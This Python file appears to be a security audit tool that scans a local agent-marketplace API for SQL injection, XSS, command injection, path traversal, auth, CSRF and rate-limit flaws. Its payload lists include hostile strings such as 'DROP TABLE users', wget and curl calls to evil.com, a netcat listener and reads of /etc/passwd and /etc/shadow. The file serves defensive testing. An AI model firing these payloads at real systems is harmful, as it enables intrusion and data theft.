#!/usr/bin/env python3
"""
Security Audit and Penetration Testing for Agent Marketplace
Comprehensive security assessment and vulnerability scanning
"""

import asyncio
import aiohttp
import json
import time
import hashlib
import base64
import random
import string
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, asdict
from urllib.parse import urljoin, urlparse
import logging

logger = logging.getLogger(__name__)

@dataclass
class SecurityFinding:
    """Security vulnerability finding"""
    severity: str  # critical, high, medium, low, info
    category: str  # e.g., "SQL Injection", "XSS", "Authentication"
    title: str
    description: str
    endpoint: str
    method: str
    payload: Optional[str]
    evidence: str
    recommendation: str
    cwe_id: Optional[str]
    timestamp: str

@dataclass
class SecurityScanResult:
    """Security scan result summary"""
    scan_type: str
    target_url: str
    total_tests: int
    vulnerabilities_found: int
    critical_count: int
    high_count: int
    medium_count: int
    low_count: int
    info_count: int
    scan_duration: float
    findings: List[SecurityFinding]
    timestamp: str

class SecurityScanner:
    """Comprehensive security scanner"""
    
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.session = None
        self.findings = []
        
        # Common payloads for testing
        self.sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "' AND 1=1 --",
            "' AND 1=2 --",
            "admin'--",
            "admin' /*",
            "' OR 1=1#",
            "' OR 'a'='a",
            "') OR ('1'='1",
            "' OR 1=1 LIMIT 1 --"
        ]
        
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>"
        ]
        
        self.command_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "; wget http://evil.com/malware",
            "`id`",
            "$(whoami)",
            "; ping -c 4 127.0.0.1",
            "| nc -l 4444",
            "&& curl http://evil.com",
            "; python -c 'import os; os.system(\"id\")'"
        ]
        
        self.path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc//passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "....\\\\....\\\\....\\\\etc\\\\passwd",
            "/var/log/apache/access.log",
            "/proc/self/environ",
            "/etc/shadow",
            "/etc/hosts"
        ]
    
    async def run_comprehensive_scan(self) -> SecurityScanResult:
        """Run comprehensive security scan"""
        logger.info(f"Starting comprehensive security scan of {self.base_url}")
        
        start_time = time.time()
        
        # Create session
        connector = aiohttp.TCPConnector(limit=10)
        timeout = aiohttp.ClientTimeout(total=30)
        self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)
        
        try:
            # Run different types of security tests
            await self._test_sql_injection()
            await self._test_xss_vulnerabilities()
            await self._test_command_injection()
            await self._test_path_traversal()
            await self._test_authentication_bypass()
            await self._test_authorization_flaws()
            await self._test_session_management()
            await self._test_input_validation()
            await self._test_information_disclosure()
            await self._test_business_logic_flaws()
            await self._test_rate_limiting_bypass()
            await self._test_csrf_vulnerabilities()
            
            # Calculate summary
            scan_duration = time.time() - start_time
            
            # Count findings by severity
            severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
            for finding in self.findings:
                severity_counts[finding.severity] += 1
            
            result = SecurityScanResult(
                scan_type="Comprehensive Security Scan",
                target_url=self.base_url,
                total_tests=len(self.sql_payloads) + len(self.xss_payloads) + len(self.command_injection_payloads) + 50,  # Approximate
                vulnerabilities_found=len(self.findings),
                critical_count=severity_counts["critical"],
                high_count=severity_counts["high"],
                medium_count=severity_counts["medium"],
                low_count=severity_counts["low"],
                info_count=severity_counts["info"],
                scan_duration=scan_duration,
                findings=self.findings,
                timestamp=datetime.now().isoformat()
            )
            
            return result
            
        finally:
            await self.session.close()
    
    async def _test_sql_injection(self):
        """Test for SQL injection vulnerabilities"""
        logger.info("Testing for SQL injection vulnerabilities...")
        
        # Test endpoints that might be vulnerable
        test_endpoints = [
            ("/api/v1/auth/login", "POST", {"email": "PAYLOAD", "password": "test"}),
            ("/api/v1/auth/register", "POST", {"name": "test", "email": "PAYLOAD", "password": "test"}),
            ("/api/v1/packages/PAYLOAD", "GET", None),
            ("/api/v1/packages/security-scanner/execute", "POST", {"package_id": "security-scanner", "task": "PAYLOAD"})
        ]
        
        for endpoint, method, payload_template in test_endpoints:
            for sql_payload in self.sql_payloads:
                try:
                    # Replace PAYLOAD with actual SQL injection payload
                    if payload_template:
                        if isinstance(payload_template, dict):
                            test_payload = {}
                            for key, value in payload_template.items():
                                if value == "PAYLOAD":
                                    test_payload[key] = sql_payload
                                else:
                                    test_payload[key] = value
                        else:
                            test_payload = payload_template
                    else:
                        test_payload = None
                    
                    test_endpoint = endpoint.replace("PAYLOAD", sql_payload)
                    
                    # Make request
                    if method == "GET":
                        async with self.session.get(urljoin(self.base_url, test_endpoint)) as response:
                            response_text = await response.text()
                            status_code = response.status
                    else:
                        async with self.session.post(urljoin(self.base_url, test_endpoint), json=test_payload) as response:
                            response_text = await response.text()
                            status_code = response.status
                    
                    # Check for SQL injection indicators
                    sql_errors = [
                        "sql syntax", "mysql", "postgresql", "sqlite", "oracle",
                        "syntax error", "database error", "query failed",
                        "table doesn't exist", "column doesn't exist"
                    ]
                    
                    response_lower = response_text.lower()
                    for error in sql_errors:
                        if error in response_lower:
                            self._add_finding(
                                severity="high",
                                category="SQL Injection",
                                title="Potential SQL Injection Vulnerability",
                                description=f"SQL injection payload triggered database error: {error}",
                                endpoint=test_endpoint,
                                method=method,
                                payload=sql_payload,
                                evidence=f"Response contains: {error}",
                                recommendation="Use parameterized queries and input validation",
                                cwe_id="CWE-89"
                            )
                            break
                    
                    # Check for unusual response patterns
                    if status_code == 500 and "error" in response_lower:
                        self._add_finding(
                            severity="medium",
                            category="SQL Injection",
                            title="Potential SQL Injection - Server Error",
                            description="SQL injection payload caused server error",
                            endpoint=test_endpoint,
                            method=method,
                            payload=sql_payload,
                            evidence=f"Status: {status_code}, Response indicates error",
                            recommendation="Implement proper error handling and input validation",
                            cwe_id="CWE-89"
                        )
                
                except Exception as e:
                    logger.debug(f"SQL injection test error: {e}")
                    continue
    
    async def _test_xss_vulnerabilities(self):
        """Test for Cross-Site Scripting vulnerabilities"""
        logger.info("Testing for XSS vulnerabilities...")
        
        test_endpoints = [
            ("/api/v1/packages/security-scanner/execute", "POST", {"package_id": "security-scanner", "task": "PAYLOAD"}),
            ("/api/v1/auth/register", "POST", {"name": "PAYLOAD", "email": "test@example.com", "password": "test"})
        ]
        
        for endpoint, method, payload_template in test_endpoints:
            for xss_payload in self.xss_payloads:
                try:
                    # Prepare payload
                    test_payload = {}
                    for key, value in payload_template.items():
                        if value == "PAYLOAD":
                            test_payload[key] = xss_payload
                        else:
                            test_payload[key] = value
                    
                    # Make request
                    async with self.session.post(urljoin(self.base_url, endpoint), json=test_payload) as response:
                        response_text = await response.text()
                        status_code = response.status
                    
                    # Check if XSS payload is reflected without encoding
                    dangerous_patterns = ["<script>", "javascript:", "onerror=", "onload=", "<img", "<svg"]
                    
                    for pattern in dangerous_patterns:
                        if pattern in xss_payload and pattern in response_text:
                            self._add_finding(
                                severity="high",
                                category="Cross-Site Scripting (XSS)",
                                title="Reflected XSS Vulnerability",
                                description=f"XSS payload reflected without proper encoding: {pattern}",
                                endpoint=endpoint,
                                method=method,
                                payload=xss_payload,
                                evidence=f"Payload reflected in response: {pattern}",
                                recommendation="Implement proper output encoding and Content Security Policy",
                                cwe_id="CWE-79"
                            )
                            break
                
                except Exception as e:
                    logger.debug(f"XSS test error: {e}")
                    continue
    
    async def _test_command_injection(self):
        """Test for command injection vulnerabilities"""
        logger.info("Testing for command injection vulnerabilities...")
        
        test_endpoints = [
            ("/api/v1/packages/security-scanner/execute", "POST", {"package_id": "security-scanner", "task": "scan example.com PAYLOAD"}),
            ("/api/v1/packages/data-processor/execute", "POST", {"package_id": "data-processor", "task": "process PAYLOAD"})
        ]
        
        for endpoint, method, payload_template in test_endpoints:
            for cmd_payload in self.command_injection_payloads:
                try:
                    # Prepare payload
                    test_payload = {}
                    for key, value in payload_template.items():
                        if "PAYLOAD" in str(value):
                            test_payload[key] = str(value).replace("PAYLOAD", cmd_payload)
                        else:
                            test_payload[key] = value
                    
                    # Make request
                    async with self.session.post(urljoin(self.base_url, endpoint), json=test_payload) as response:
                        response_text = await response.text()
                        status_code = response.status
                    
                    # Check for command execution indicators
                    command_indicators = [
                        "root:", "uid=", "gid=", "/bin/", "/etc/passwd",
                        "PING", "64 bytes from", "total", "drwx"
                    ]
                    
                    for indicator in command_indicators:
                        if indicator in response_text:
                            self._add_finding(
                                severity="critical",
                                category="Command Injection",
                                title="Command Injection Vulnerability",
                                description=f"Command injection payload executed: {indicator}",
                                endpoint=endpoint,
                                method=method,
                                payload=cmd_payload,
                                evidence=f"Response contains command output: {indicator}",
                                recommendation="Use input validation and avoid system command execution",
                                cwe_id="CWE-78"
                            )
                            break
                
                except Exception as e:
                    logger.debug(f"Command injection test error: {e}")
                    continue
    
    async def _test_path_traversal(self):
        """Test for path traversal vulnerabilities"""
        logger.info("Testing for path traversal vulnerabilities...")
        
        for payload in self.path_traversal_payloads:
            try:
                # Test in URL path
                test_endpoint = f"/api/v1/packages/{payload}"
                
                async with self.session.get(urljoin(self.base_url, test_endpoint)) as response:
                    response_text = await response.text()
                    status_code = response.status
                
                # Check for file content indicators
                file_indicators = [
                    "root:x:", "daemon:", "bin:", "sys:", "[boot loader]",
                    "127.0.0.1", "localhost", "# /etc/hosts"
                ]
                
                for indicator in file_indicators:
                    if indicator in response_text:
                        self._add_finding(
                            severity="high",
                            category="Path Traversal",
                            title="Path Traversal Vulnerability",
                            description=f"Path traversal payload accessed system file: {indicator}",
                            endpoint=test_endpoint,
                            method="GET",
                            payload=payload,
                            evidence=f"Response contains file content: {indicator}",
                            recommendation="Implement proper input validation and file access controls",
                            cwe_id="CWE-22"
                        )
                        break
            
            except Exception as e:
                logger.debug(f"Path traversal test error: {e}")
                continue
    
    async def _test_authentication_bypass(self):
        """Test for authentication bypass vulnerabilities"""
        logger.info("Testing for authentication bypass vulnerabilities...")
        
        # Test endpoints that should require authentication
        protected_endpoints = [
            "/api/v1/user/credits",
            "/api/v1/user/rate-limits",
            "/api/v1/user/usage",
            "/api/v1/user/executions"
        ]
        
        for endpoint in protected_endpoints:
            try:
                # Test without authentication
                async with self.session.get(urljoin(self.base_url, endpoint)) as response:
                    status_code = response.status
                    response_text = await response.text()
                
                # If we get 200 OK, it might be an authentication bypass
                if status_code == 200:
                    self._add_finding(
                        severity="medium",
                        category="Authentication Bypass",
                        title="Potential Authentication Bypass",
                        description="Protected endpoint accessible without authentication",
                        endpoint=endpoint,
                        method="GET",
                        payload=None,
                        evidence=f"Status: {status_code} (should be 401/403)",
                        recommendation="Implement proper authentication checks",
                        cwe_id="CWE-287"
                    )
            
            except Exception as e:
                logger.debug(f"Authentication bypass test error: {e}")
                continue
    
    async def _test_authorization_flaws(self):
        """Test for authorization flaws"""
        logger.info("Testing for authorization flaws...")
        
        # Test accessing other users' data
        test_cases = [
            ("/api/v1/user/credits?user_id=999", "GET"),
            ("/api/v1/user/executions?user_id=999", "GET"),
            ("/api/v1/admin/users", "GET"),
            ("/api/v1/admin/stats", "GET")
        ]
        
        for endpoint, method in test_cases:
            try:
                async with self.session.get(urljoin(self.base_url, endpoint)) as response:
                    status_code = response.status
                    response_text = await response.text()
                
                # Check for unauthorized access
                if status_code == 200 and "admin" in endpoint:
                    self._add_finding(
                        severity="high",
                        category="Authorization Flaw",
                        title="Unauthorized Admin Access",
                        description="Admin endpoint accessible without proper authorization",
                        endpoint=endpoint,
                        method=method,
                        payload=None,
                        evidence=f"Status: {status_code}",
                        recommendation="Implement proper role-based access control",
                        cwe_id="CWE-862"
                    )
            
            except Exception as e:
                logger.debug(f"Authorization test error: {e}")
                continue
    
    async def _test_session_management(self):
        """Test session management security"""
        logger.info("Testing session management...")
        
        # Test login functionality
        try:
            login_data = {"email": "demo@example.com", "password": "demo123"}
            async with self.session.post(urljoin(self.base_url, "/api/v1/auth/login"), json=login_data) as response:
                status_code = response.status
                headers = response.headers
                
                # Check for secure session handling
                if status_code == 200:
                    # Check for secure cookie flags
                    set_cookie = headers.get('Set-Cookie', '')
                    if set_cookie:
                        if 'Secure' not in set_cookie:
                            self._add_finding(
                                severity="medium",
                                category="Session Management",
                                title="Insecure Session Cookie",
                                description="Session cookie missing Secure flag",
                                endpoint="/api/v1/auth/login",
                                method="POST",
                                payload=None,
                                evidence="Set-Cookie header missing Secure flag",
                                recommendation="Add Secure and HttpOnly flags to session cookies",
                                cwe_id="CWE-614"
                            )
                        
                        if 'HttpOnly' not in set_cookie:
                            self._add_finding(
                                severity="medium",
                                category="Session Management",
                                title="Session Cookie Accessible via JavaScript",
                                description="Session cookie missing HttpOnly flag",
                                endpoint="/api/v1/auth/login",
                                method="POST",
                                payload=None,
                                evidence="Set-Cookie header missing HttpOnly flag",
                                recommendation="Add HttpOnly flag to prevent XSS cookie theft",
                                cwe_id="CWE-1004"
                            )
        
        except Exception as e:
            logger.debug(f"Session management test error: {e}")
    
    async def _test_input_validation(self):
        """Test input validation"""
        logger.info("Testing input validation...")
        
        # Test with various malformed inputs
        malformed_inputs = [
            "A" * 10000,  # Very long string
            "\x00\x01\x02",  # Control characters
            "{'malformed': json}",  # Malformed JSON
            "<xml>test</xml>",  # XML input
            "null",  # Null input
            "undefined",  # Undefined
            "NaN",  # Not a Number
            "Infinity",  # Infinity
        ]
        
        test_endpoint = "/api/v1/packages/security-scanner/execute"
        
        for malformed_input in malformed_inputs:
            try:
                payload = {"package_id": "security-scanner", "task": malformed_input}
                
                async with self.session.post(urljoin(self.base_url, test_endpoint), json=payload) as response:
                    status_code = response.status
                    response_text = await response.text()
                
                # Check for server errors due to poor input validation
                if status_code == 500:
                    self._add_finding(
                        severity="low",
                        category="Input Validation",
                        title="Poor Input Validation",
                        description="Server error caused by malformed input",
                        endpoint=test_endpoint,
                        method="POST",
                        payload=malformed_input[:100],  # Truncate for readability
                        evidence=f"Status: {status_code}",
                        recommendation="Implement robust input validation and error handling",
                        cwe_id="CWE-20"
                    )
            
            except Exception as e:
                logger.debug(f"Input validation test error: {e}")
                continue
    
    async def _test_information_disclosure(self):
        """Test for information disclosure"""
        logger.info("Testing for information disclosure...")
        
        # Test error pages and debug information
        test_endpoints = [
            "/nonexistent-endpoint",
            "/api/v1/nonexistent",
            "/api/v1/packages/nonexistent/execute"
        ]
        
        for endpoint in test_endpoints:
            try:
                async with self.session.get(urljoin(self.base_url, endpoint)) as response:
                    response_text = await response.text()
                    status_code = response.status
                
                # Check for information disclosure in error messages
                disclosure_indicators = [
                    "traceback", "stack trace", "/home/", "/var/",
                    "database", "sql", "exception", "debug",
                    "internal server error", "python", "fastapi"
                ]
                
                response_lower = response_text.lower()
                for indicator in disclosure_indicators:
                    if indicator in response_lower:
                        self._add_finding(
                            severity="low",
                            category="Information Disclosure",
                            title="Information Disclosure in Error Messages",
                            description=f"Error message contains sensitive information: {indicator}",
                            endpoint=endpoint,
                            method="GET",
                            payload=None,
                            evidence=f"Response contains: {indicator}",
                            recommendation="Implement generic error messages for production",
                            cwe_id="CWE-209"
                        )
                        break
            
            except Exception as e:
                logger.debug(f"Information disclosure test error: {e}")
                continue
    
    async def _test_business_logic_flaws(self):
        """Test for business logic flaws"""
        logger.info("Testing for business logic flaws...")
        
        # Test credit manipulation
        try:
            # Try negative credit purchase
            payload = {
                "customer_email": "test@example.com",
                "package": "starter",
                "amount": -100
            }
            
            async with self.session.post(urljoin(self.base_url, "/api/v1/credits/purchase"), json=payload) as response:
                status_code = response.status
                response_text = await response.text()
            
            if status_code == 200:
                self._add_finding(
                    severity="high",
                    category="Business Logic Flaw",
                    title="Negative Credit Purchase Allowed",
                    description="System allows negative credit purchases",
                    endpoint="/api/v1/credits/purchase",
                    method="POST",
                    payload=str(payload),
                    evidence=f"Status: {status_code}",
                    recommendation="Implement proper business logic validation",
                    cwe_id="CWE-840"
                )
        
        except Exception as e:
            logger.debug(f"Business logic test error: {e}")
    
    async def _test_rate_limiting_bypass(self):
        """Test for rate limiting bypass"""
        logger.info("Testing for rate limiting bypass...")
        
        # Test rapid requests
        endpoint = "/api/v1/packages"
        rapid_requests = 20
        
        try:
            start_time = time.time()
            success_count = 0
            
            for i in range(rapid_requests):
                async with self.session.get(urljoin(self.base_url, endpoint)) as response:
                    if response.status == 200:
                        success_count += 1
            
            duration = time.time() - start_time
            requests_per_second = rapid_requests / duration
            
            # If too many requests succeed too quickly, rate limiting might be weak
            if success_count > 15 and requests_per_second > 10:
                self._add_finding(
                    severity="medium",
                    category="Rate Limiting",
                    title="Weak Rate Limiting",
                    description=f"High request rate allowed: {requests_per_second:.1f} RPS",
                    endpoint=endpoint,
                    method="GET",
                    payload=None,
                    evidence=f"{success_count}/{rapid_requests} requests succeeded",
                    recommendation="Implement stricter rate limiting",
                    cwe_id="CWE-770"
                )
        
        except Exception as e:
            logger.debug(f"Rate limiting test error: {e}")
    
    async def _test_csrf_vulnerabilities(self):
        """Test for CSRF vulnerabilities"""
        logger.info("Testing for CSRF vulnerabilities...")
        
        # Test state-changing operations without CSRF protection
        csrf_endpoints = [
            ("/api/v1/auth/register", "POST", {"name": "csrf_test", "email": "csrf@test.com", "password": "test"}),
            ("/api/v1/credits/purchase", "POST", {"customer_email": "test@example.com", "package": "starter"})
        ]
        
        for endpoint, method, payload in csrf_endpoints:
            try:
                # Make request without CSRF token
                async with self.session.post(urljoin(self.base_url, endpoint), json=payload) as response:
                    status_code = response.status
                    headers = response.headers
                
                # Check if request succeeded without CSRF protection
                if status_code in [200, 201]:
                    # Check if there's any CSRF protection in headers
                    csrf_headers = ['X-CSRF-Token', 'X-CSRFToken', 'CSRF-Token']
                    has_csrf_protection = any(header in headers for header in csrf_headers)
                    
                    if not has_csrf_protection:
                        self._add_finding(
                            severity="medium",
                            category="Cross-Site Request Forgery (CSRF)",
                            title="Missing CSRF Protection",
                            description="State-changing operation lacks CSRF protection",
                            endpoint=endpoint,
                            method=method,
                            payload=None,
                            evidence="No CSRF token required",
                            recommendation="Implement CSRF tokens for state-changing operations",
                            cwe_id="CWE-352"
                        )
            
            except Exception as e:
                logger.debug(f"CSRF test error: {e}")
                continue
    
    def _add_finding(self, severity: str, category: str, title: str, description: str,
                    endpoint: str, method: str, payload: Optional[str], evidence: str,
                    recommendation: str, cwe_id: Optional[str]):
        """Add a security finding"""
        finding = SecurityFinding(
            severity=severity,
            category=category,
            title=title,
            description=description,
            endpoint=endpoint,
            method=method,
            payload=payload,
            evidence=evidence,
            recommendation=recommendation,
            cwe_id=cwe_id,
            timestamp=datetime.now().isoformat()
        )
        self.findings.append(finding)

async def run_security_audit(base_url: str = "http://localhost:8000") -> Dict[str, Any]:
    """Run comprehensive security audit"""
    print("🔒 Starting Comprehensive Security Audit")
    print("=" * 60)
    
    scanner = SecurityScanner(base_url)
    result = await scanner.run_comprehensive_scan()
    
    # Generate report
    report = {
        "scan_result": asdict(result),
        "executive_summary": {
            "total_vulnerabilities": result.vulnerabilities_found,
            "critical_issues": result.critical_count,
            "high_issues": result.high_count,
            "medium_issues": result.medium_count,
            "low_issues": result.low_count,
            "risk_score": _calculate_risk_score(result),
            "overall_security_rating": _get_security_rating(result)
        },
        "recommendations": _generate_security_recommendations(result),
        "compliance_status": _check_compliance_status(result)
    }
    
    return report

def _calculate_risk_score(result: SecurityScanResult) -> float:
    """Calculate overall risk score (0-100)"""
    score = 0
    score += result.critical_count * 25
    score += result.high_count * 15
    score += result.medium_count * 8
    score += result.low_count * 3
    
    return min(score, 100)

def _get_security_rating(result: SecurityScanResult) -> str:
    """Get overall security rating"""
    risk_score = _calculate_risk_score(result)
    
    if risk_score >= 80:
        return "Critical"
    elif risk_score >= 60:
        return "High Risk"
    elif risk_score >= 40:
        return "Medium Risk"
    elif risk_score >= 20:
        return "Low Risk"
    else:
        return "Secure"

def _generate_security_recommendations(result: SecurityScanResult) -> List[str]:
    """Generate security recommendations"""
    recommendations = []
    
    if result.critical_count > 0:
        recommendations.append("🚨 CRITICAL: Address all critical vulnerabilities immediately before deployment")
    
    if result.high_count > 0:
        recommendations.append("⚠️ HIGH: Fix high-severity vulnerabilities as priority")
    
    # Category-specific recommendations
    categories = {}
    for finding in result.findings:
        if finding.category not in categories:
            categories[finding.category] = 0
        categories[finding.category] += 1
    
    for category, count in categories.items():
        if count >= 3:
            recommendations.append(f"🔧 Multiple {category} issues found - review input validation and security controls")
    
    # General recommendations
    recommendations.extend([
        "🛡️ Implement Web Application Firewall (WAF)",
        "🔐 Enable HTTPS with strong TLS configuration",
        "📝 Implement comprehensive logging and monitoring",
        "🔄 Regular security testing and code reviews",
        "📚 Security training for development team"
    ])
    
    return recommendations

def _check_compliance_status(result: SecurityScanResult) -> Dict[str, str]:
    """Check compliance with security standards"""
    compliance = {}
    
    # OWASP Top 10 compliance
    owasp_issues = sum(1 for finding in result.findings if finding.cwe_id in [
        "CWE-89", "CWE-79", "CWE-287", "CWE-862", "CWE-614", "CWE-22", "CWE-78", "CWE-352"
    ])
    
    compliance["OWASP Top 10"] = "Non-Compliant" if owasp_issues > 0 else "Compliant"
    
    # PCI DSS (basic check)
    critical_issues = result.critical_count + result.high_count
    compliance["PCI DSS"] = "Non-Compliant" if critical_issues > 0 else "Likely Compliant"
    
    # SOC 2 (basic check)
    compliance["SOC 2"] = "Review Required" if result.vulnerabilities_found > 0 else "Likely Compliant"
    
    return compliance

if __name__ == "__main__":
    # Run security audit
    async def main():
        report = await run_security_audit()
        
        print("\n" + "=" * 60)
        print("🔒 SECURITY AUDIT SUMMARY")
        print("=" * 60)
        
        summary = report["executive_summary"]
        print(f"Total Vulnerabilities: {summary['total_vulnerabilities']}")
        print(f"Critical: {summary['critical_issues']}")
        print(f"High: {summary['high_issues']}")
        print(f"Medium: {summary['medium_issues']}")
        print(f"Low: {summary['low_issues']}")
        print(f"Risk Score: {summary['risk_score']}/100")
        print(f"Security Rating: {summary['overall_security_rating']}")
        
        print("\n🔧 Key Recommendations:")
        for rec in report["recommendations"][:5]:
            print(f"  {rec}")
        
        print("\n📋 Compliance Status:")
        for standard, status in report["compliance_status"].items():
            print(f"  {standard}: {status}")
        
        # Save detailed report
        with open("security_audit_report.json", "w") as f:
            json.dump(report, f, indent=2)
        print(f"\n📄 Detailed report saved to security_audit_report.json")
    
    asyncio.run(main())
